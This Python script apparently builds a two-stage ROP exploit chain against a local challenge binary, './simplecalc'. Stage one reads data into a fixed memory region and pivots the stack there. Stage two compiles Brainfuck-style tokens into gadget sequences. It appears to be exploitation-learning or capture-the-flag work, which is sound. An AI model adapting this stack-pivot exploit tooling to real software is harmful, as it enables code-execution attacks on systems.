#!/usr/bin/env python3

from math import ceil
from exploiterRaw import exploiterRaw
from metaGadget import *
import argparse
import os.path
from preprocessor import preprocessor
from preprocessorInitiator import preprocessorInitiator

from sentenceGenerator import sentenceGenerator

EXEC_PATH = './simplecalc'

my_parser = argparse.ArgumentParser(description='Compiles to rop-code binary')

my_parser.add_argument('Input',
                       metavar='input',
                       type=str,
                       help='the path to the source code file')
                       
my_parser.add_argument('-o', '--output',
                       metavar='output',
                       required=False,
                       type=str,
                       help='the path of the compiled binary output')

args = my_parser.parse_args()
args_dict = vars(args)

input_path = args.Input
output_path = ''

if args_dict['output']:
    output_path = args_dict['output']

class compiler:
    DATA_SIZE = 3

    def __init__(self, preprocessor : preprocessor, ea_data, upper : sentenceGenerator = None) -> None:
        self.preprocessor = preprocessor
        self.ea_data = ea_data
        self.tokens = '<>+-.,[]'
        self.upper = upper

    def code_size(self):
        return self.upper.intermediate.exp.numOfOps

    def get_data_addr(self, index):
        return self.preprocessor.VAR_ARR + index * 8


    def do_ptr_move(self, direction):
        self.upper.move_ptr(direction)


    def do_ptr_value(self, positive):
        self.upper.add_ptr(positive)


    def do_output(self):
        pass


    def do_input(self):
        pass

    def parse_token(self, token):
        assert token in self.tokens

        if token == '<':
            self.do_ptr_move(False)

        elif token == '>':
            self.do_ptr_move(True)

        elif token == '+':
            self.do_ptr_value(True)

        elif token == '-':
            self.do_ptr_value(False)

        elif token == '.':
            self.do_output()
        
        elif token == ',':
            self.do_input()

        elif token == '[':
            pass

        elif token == ']':
            pass
        else:
            raise('Unkown token')

    def exec_tokens(self, tokens):
        assert all(x in self.tokens for x in tokens)
        for token in tokens:
            self.parse_token(token)

    def init(self):
        for x in range(self.DATA_SIZE):
            self.upper.pre_assignment(self.get_data_addr(x), 0)


def initialize_output_file(output_path):
    if os.path.isfile(output_path):
        try:
            open(output_path, 'w').close()
        except IOError:
            print('Failure')


if output_path != '':
    initialize_output_file(output_path)

repository_start = 0x00000000006C1060
repository_end = 0x00000000006C5190

repository_size = repository_end - repository_start

# Stage 1

stage1Exploiter = exploiter()
stage1Exploiter.set_output_file(output_path)
gen1 = metaGadetGenerator(stage1Exploiter)

gen1.ret2_read(0, repository_start, repository_size)
gen1.rsp_equ(repository_start)
gen1.finalize()

# Stage 2

stage2Exploiter = exploiterRaw()
stage2Exploiter.set_output_file(output_path)
gen2 = metaGadetGenerator(stage2Exploiter)



pre = preprocessor(0x00000000006C1060)
bf = compiler(pre, 0x00000000006C1060)

upperTranslator = sentenceGenerator(gen2, pre)
bf.upper = upperTranslator

preprocessorInitiator(pre).initialize(upperTranslator)
bf.init()

# Main execution
bf.upper.mark()
bf.parse_token('>')
bf.parse_token('+')
bf.parse_token('<')
bf.parse_token('-')
bf.upper.mark()

gen2.finalize()

used,avail = 8 * (bf.code_size()), repository_size
usedPerc = round((ceil(used) / avail) * 100, 2)

print(f'Stage 1:    Complete')
print('')

print(f'Stage 2:    [ {used} / {avail} ]')
print(f'            [ {usedPerc}% ] Usage')
